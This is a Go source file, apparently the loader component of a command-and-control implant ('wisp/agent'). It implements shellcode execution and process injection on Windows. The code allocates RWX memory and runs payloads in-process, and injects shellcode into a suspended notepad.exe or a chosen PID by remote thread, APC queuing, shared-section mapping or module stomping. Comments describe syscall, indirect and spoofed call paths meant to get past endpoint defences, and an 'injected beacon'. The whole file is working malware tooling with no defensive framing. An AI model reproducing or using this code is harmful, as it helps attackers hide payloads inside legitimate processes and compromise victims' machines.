//go:build windows

package loader

import (
	"fmt"
	"runtime"
	"unsafe"

	"github.com/user/wisp/agent/internal/win"
	"golang.org/x/sys/windows"
)

// The cached x/sys build lacks VirtualAllocEx / CreateRemoteThread /
// QueueUserAPC, so they are resolved at runtime from kernel32. These LazyProcs
// are the natural hook point where the direct-vs-indirect call matrix will
// attach later (swap the proc for an ntdll gadget trampoline).
var (
	kernel32               = windows.NewLazySystemDLL("kernel32.dll")
	procVirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
	procQueueUserAPC       = kernel32.NewProc("QueueUserAPC")
	procVirtualAlloc       = kernel32.NewProc("VirtualAlloc")
	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
	procCreateProcessW     = kernel32.NewProc("CreateProcessW")
	procResumeThread       = kernel32.NewProc("ResumeThread")
	procCloseHandle        = kernel32.NewProc("CloseHandle")
	procGetCurrentProcess  = kernel32.NewProc("GetCurrentProcess")
)

func defaultProcess() string { return "C:\\Windows\\System32\\notepad.exe" }

// allocateRWX reserves executable memory honouring the configured call type:
//
//	api       → kernel32 VirtualAlloc (L1)
//	syscall   → NtAllocateVirtualMemory raw syscall (L4)
//	indirect  → NtAllocateVirtualMemory via ntdll gadget (L5)
func allocateRWX(size uintptr, callType CallType) (uintptr, error) {
	// Syscall / indirect / spoofed paths fall back to the kernel32 API when the
	// target's syscall mechanism rejects direct calls (observed on some
	// Windows 11 24H2 builds), so payload delivery still succeeds.
	if callType == CallSyscall || callType == CallIndirect || callType == CallSpoofed {
		win.EnsureSSNs()
		mode := win.InvokeDirect
		switch callType {
		case CallIndirect:
			mode = win.InvokeIndirect
		case CallSpoofed:
			mode = win.InvokeSpoofed
		}
		if addr, err := win.AllocateVirtualMemory(mode, size, windows.PAGE_EXECUTE_READWRITE); err == nil && addr != 0 {
			return addr, nil
		}
		// fall through to the direct API
	}
	addr, _, err := procVirtualAlloc.Call(0, size, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return 0, fmt.Errorf("VirtualAlloc: %v", err)
	}
	return addr, nil
}

// execCode is implemented in trampoline_<arch>.s; it jumps to the shellcode.
func execCode(addr uintptr)

// exec allocates RWX memory in the current process and runs the shellcode on a
// goroutine. The goroutine blocks for the lifetime of the payload.
func exec(shellcode []byte, c Config) (*Result, error) {
	if runtime.GOARCH != "amd64" && runtime.GOARCH != "arm64" {
		return nil, fmt.Errorf("in-process shellcode execution unsupported on %s", runtime.GOARCH)
	}

	cur, _, _ := procGetCurrentProcess.Call()
	addr, err := allocateRWX(uintptr(len(shellcode)), c.CallType)
	if err != nil {
		return nil, fmt.Errorf("allocate (0x%x): %w", addr, err)
	}
	if addr == 0 {
		return nil, fmt.Errorf("allocate returned nil address (call_type=%s)", c.CallType)
	}

	var written uintptr
	r1, _, e1 := procWriteProcessMemory.Call(cur, addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), uintptr(unsafe.Pointer(&written)))
	if r1 == 0 {
		return nil, fmt.Errorf("WriteProcessMemory(addr=0x%x): %v", addr, e1)
	}

	go execCode(addr)
	return &Result{
		Method: "exec",
		PID:    windows.GetCurrentProcessId(),
		Size:   len(shellcode),
		Status: "running",
	}, nil
}

// spawnProc creates a suspended process using the configured target image and
// returns its process and primary thread handles.
func (c Config) spawnProc() (proc windows.Handle, thread windows.Handle, err error) {
	image := c.Process
	if image == "" {
		image = defaultProcess()
	}
	imagePtr, err := windows.UTF16PtrFromString(image)
	if err != nil {
		return 0, 0, err
	}
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi windows.ProcessInformation
	r1, _, e1 := procCreateProcessW.Call(
		0,
		uintptr(unsafe.Pointer(imagePtr)),
		0, 0,
		0,
		uintptr(windows.CREATE_SUSPENDED),
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if r1 == 0 {
		return 0, 0, fmt.Errorf("CreateProcess(%s): %v", image, e1)
	}
	return pi.Process, pi.Thread, nil
}

// allocRemote reserves RWX memory in a process and writes the shellcode in.
// Remote allocation always uses VirtualAllocEx (allocation happens in another
// process, so the syscall path is not applicable here).
func allocRemote(proc windows.Handle, shellcode []byte) (uintptr, error) {
	addr, _, err := procVirtualAllocEx.Call(uintptr(proc), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return 0, fmt.Errorf("VirtualAllocEx: %v", err)
	}
	var written uintptr
	r1, _, e1 := procWriteProcessMemory.Call(uintptr(proc), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), uintptr(unsafe.Pointer(&written)))
	if r1 == 0 {
		procVirtualAllocEx.Call(uintptr(proc), addr, uintptr(len(shellcode)), windows.MEM_RELEASE, 0)
		return 0, fmt.Errorf("WriteProcessMemory: %v", e1)
	}
	return addr, nil
}

// inject implements the remote injection methods:
//   - InjectAPC / InjectForkAndRun spawn a suspended process, write the
//     shellcode, queue an APC on the primary thread and resume it.
//   - InjectRemoteThread either spawns a suspended process or opens an existing
//     PID, writes the shellcode and starts a remote thread.
//   - InjectSection maps the shellcode via a shared section (no
//     VirtualAllocEx / WriteProcessMemory), then starts a remote thread.
//   - InjectPhantom (UDRL) runs in-process from a DLL-backed CoW mapping.
func inject(shellcode []byte, c Config) (*Result, error) {
	// UDRL / module stomping is an in-process technique; it does not need a
	// remote process handle. Run it directly.
	if c.InjectMethod == InjectPhantom {
		addr, err := win.PhantomLoad(shellcode, true)
		if err != nil {
			return nil, err
		}
		return &Result{
			Method:  string(InjectPhantom),
			Process: "self (module-backed)",
			PID:     windows.GetCurrentProcessId(),
			Size:    len(shellcode),
			Status:  "running",
			Address: addr,
		}, nil
	}

	var proc windows.Handle
	var thread windows.Handle
	owned := false
	var pid uint32

	switch {
	case c.Pid != 0:
		h, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ, false, c.Pid)
		if err != nil {
			return nil, fmt.Errorf("OpenProcess(%d): %v", c.Pid, err)
		}
		proc = h
		pid = c.Pid
	default:
		p, t, err := c.spawnProc()
		if err != nil {
			return nil, err
		}
		proc, thread = p, t
		owned = true
	}

	defer func() {
		if owned && thread != 0 {
			procCloseHandle.Call(uintptr(thread))
		}
		procCloseHandle.Call(uintptr(proc))
	}()

	var addr uintptr
	var err error
	if c.InjectMethod == InjectSection {
		// Section injection needs PROCESS_VM_OPERATION + the shared section; no
		// VirtualAllocEx / WriteProcessMemory. Fall back to the classic path if
		// the NT section primitives are unavailable.
		addr, err = win.SectionInjection(proc, shellcode)
		if err != nil {
			return nil, fmt.Errorf("section injection: %w", err)
		}
	} else {
		addr, err = allocRemote(proc, shellcode)
		if err != nil {
			return nil, err
		}
	}

	switch c.InjectMethod {
	case InjectRemoteThread:
		var threadID uint32
		r1, _, e1 := procCreateRemoteThread.Call(uintptr(proc), 0, 0, addr, 0, 0, uintptr(unsafe.Pointer(&threadID)))
		if r1 == 0 {
			return nil, fmt.Errorf("CreateRemoteThread: %v", e1)
		}
		procCloseHandle.Call(r1)
		// The child was created SUSPENDED; release its main thread so the
		// injected beacon (running on the remote thread) has a live process.
		if owned && thread != 0 {
			procResumeThread.Call(uintptr(thread))
		}
	case InjectAPC, InjectForkAndRun:
		if thread == 0 {
			return nil, fmt.Errorf("injection method %s requires a freshly spawned suspended process", c.InjectMethod)
		}
		r1, _, e1 := procQueueUserAPC.Call(addr, uintptr(thread), 0)
		if r1 == 0 {
			return nil, fmt.Errorf("QueueUserAPC: %v", e1)
		}
		procResumeThread.Call(uintptr(thread))
	default:
		return nil, fmt.Errorf("unknown injection method: %s", c.InjectMethod)
	}

	return &Result{
		Method:  string(c.InjectMethod),
		Process: c.Process,
		PID:     pid,
		Size:    len(shellcode),
		Status:  "injected",
	}, nil
}

// spawn is fork-and-run: spawn a suspended process, inject via APC, resume.
func spawn(shellcode []byte, c Config) (*Result, error) {
	// Default to fork-and-run, but honour an explicitly requested injection
	// method (e.g. section / phantom) so `spawn` can drive the evasive paths.
	if c.InjectMethod == "" {
		c.InjectMethod = InjectForkAndRun
	}
	return inject(shellcode, c)
}
